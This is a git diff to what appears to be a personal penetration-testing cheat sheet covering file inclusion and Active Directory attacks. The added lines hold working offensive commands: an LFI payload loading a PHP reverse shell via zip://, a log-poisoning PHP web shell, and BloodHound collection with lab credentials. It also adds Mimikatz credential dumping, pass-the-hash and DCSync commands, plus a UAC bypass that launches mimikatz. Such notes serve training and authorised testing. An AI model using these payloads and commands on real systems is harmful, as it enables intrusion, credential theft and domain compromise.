@@ -2065,7 +2065,12 @@ Directory traversal vulnerabilities allow an attacker to read local secret files
 
 File inclusion vulnerabilities allow an attacker to include a file into the application’s running code. To identify these vulnerabilities, you can search for file extensions in URL query strings and common vulnerable parameters like `file`, `path` and `folder` (see [scripts/fg.rb](scripts/fg.rb)).
 
-**Local File Inclusion (LFI)**: execute a local file. An example: Apache's access.log contamination
+**Local File Inclusion (LFI)**: execute a local file
+
+- Try `zip://`, `php://` and other wrappers
+  - With `zip://` you can achieve RCE. Example: `http://192.168.190.229/index.php?file=zip:///var/www/html/uploads/upload_1692869993.zip%23php-reverse-shell.php`
+
+Apache's access.log contamination
 1. Once found a LFI, read the Apache's access.log `http://victim.com/page.php?file=<PAYLOAD>`
    - Use `C:\xampp\apache\logs\access.log` or `../../../../../../../../../var/log/apache2/access.log`
 2. Notice which values from requests are saved. Contaminate Apache logs by sending this payload `<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>` in the User-Agent
@@ -5514,6 +5519,17 @@ Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion     
 Find-LocalAdminAccess                                                                                                                     Scan domain to find local administrative privileges for our user
 Get-NetSession -ComputerName INPUT -Verbose                                                                                               Check logged on users with Get-NetSession
 Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl                                                   Display permissions on the DefaultSecurity registry hive
+Get-NetUser -SPN                                                                                                                          Kerberoastable users
+Get-ADGroupMember 'Web Admins'                                                                                                            Get details about a group, in this case, 'Web Admins'
+Get-NetUser | select Description                                                                                                          Enumerate the domain users descriptions
+Get-NetGroup -GroupName *admin*                                                                                                           Enumerate the domain groups
+Get-NetComputer -fulldata | select operatingsystem                                                                                        Find all operating systems running
+
+
+Get details, in this case, about user svc__apache
+-------------------------------------------------
+Get-ADServiceAccount -Filter {name -eq 'svc_apache'} -Properties * | Select CN,DNSHostName,DistinguishedName,MemberOf,Created,LastLogonDate,PasswordLastSet,msDS-ManagedPasswordInterval,PrincipalsAllowedToDelegateToAccount,PrincipalsAllowedToRetrieveManagedPassword,ServicePrincipalNames
+
 
 Object Permissions Enumeration
 ------------------------------
@@ -5522,11 +5538,13 @@ Convert-SidToName <SID>                                                         
 "<SID>", "<SID>", "<SID>", "<SID>", ... | Convert-SidToName                                                                               Convert <SID>s into names
 Get-ObjectAcl -Identity "<group>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights       Enumerat ACLs for <group>, only display values equal to GenericAll
 
+
 Domain Shares Enumeration
 -------------------------
-Find-DomainShare                                                                                                                          Find Domain Shares
+Find-DomainShare
+Invoke-ShareFinder                                                                                                                       Find Domain Shares
 ```
-- See also [PowerView-3.0-tricks.ps1](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
+- See also [PowerView-3.0-tricks.ps1](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993), [HackTricks](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview) and [HarmJ0y](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
 
 #### <ins>Initial foothold</ins>
 - run `responder` + `mitm6`
@@ -5624,7 +5642,13 @@ Find-DomainShare       Find Domain Shares
 Import-Module .\Sharphound.ps1                                                                  Import SharpHound; https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1
 Get-Help Invoke-BloodHound                                                                      Learn more about Invoke-BloodHound; To run SharpHound you must first start BloodHound
 Invoke-BloodHound -CollectionMethod All -OutputDirectory <DIR> -OutputPrefix "corp audit"       Collect domain data
+Invoke-Bloodhound -CollectionMethod All -Domain domain.local -ZipFileName file.zip
 ```
+
+Alternatives
+- `python3 /home/kali/Documents/windows-attack/Scripts/BloodHound.py/bloodhound.py -d heist.offsec -u enox -p california -c all -ns 192.168.212.165`
+- `.\SharpHound.exe -c All -d CONTROLLER.local --zipfilename loot.zip`
+- `SharpHound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs`
 
 #### <ins>BloodHound</ins>
 
@@ -5640,6 +5664,11 @@ Invoke-BloodHound -CollectionMethod All -OutputDirectory <DIR> -OutputPrefix "co
 - Custom queries
   - `MATCH (m:Computer) RETURN m`  to display all computers
   - `MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p` to display all active sessions
+- Try every query
+  - See the groups of the user pwned, query 'Shortest Path to High Value targets'
+  - Active Directory security groups: https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#bkmk-accountoperators
+  - Search for the users / machines owned and mark them as it. Then use the query 'Reachable High Value Targets'
+
 
 #### <ins>Mimikatz</ins>
 
@@ -5647,10 +5676,12 @@ After starting `mimikatz.exe`, run the command `privilege::debug` to enable `SeD
 ```
 sekurlsa::logonpasswords                                                           Dump the credentials of all logged-on users
 sekurlsa::tickets                                                                  Tickets stored in memory
+sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:powershell       Overpass the Hash
+sekurlsa::msv                                                                      Extracting NTLM hashes from LSASS memory
 crypto::capi                                                                       Make non-exportable keys exportable; CryptoAPI function
 crypto::cng                                                                        Make non-exportable keys exportable; KeyIso service
 lsadump::dcsync /user:<domain>\<user>                                              Domain Controller Synchronization
-sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:powershell       Overpass the Hash
+lsadump::lsa /patch                                                                Dump the hashes
 ```
 
 Other commands to run
@@ -5659,7 +5690,22 @@ Other commands to run
 - `lsadump::secrets`
 - `lsadump::cache`
 - `lsadump::ekeys`
-- `sekurlsa::msv`
+
+Notes
+- If `privilege::debug` doesn't work, try with:
+  - `. .\Invoke-PsUACme.ps1`
+  - `Invoke-PsUACme -method oobe -Payload "powershell -ExecutionPolicy Bypass -noexit -file C:\temp\mimikatz.exe"`
+- You can: steal credentials, generate Kerberos tickets, dump credentials stored in memory and leverage attacks
+- A few attacks: Credential dumping, Pass-the-Hash, Over-Pass-the-Hash, Pass-the-Ticket, Golden Ticket, Silver Ticket
+- See https://github.com/gentilkiwi/mimikatz/wiki
+- The first thing to do is always to run `privilege::debug`
+- See: https://github.com/drak3hft7/Cheat-Sheet---Active-Directory
+- With mimikatz you can turn on the feature widgets. It enables you to see then password in plain text for users that logon and log off
+- See also `Invoke-Mimikatz`
+- Use `/patch` with a command, it might work
+   - esempio: `lsadump::sam /patch`
+- https://adsecurity.org/?page_id=1821
+- You can also run commands like this: `.\mimikatz 'lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:administrator' exit`, especially if you see the prompt going nuts
 
 
 #### <ins>Active Directory Authentication Attacks</ins>
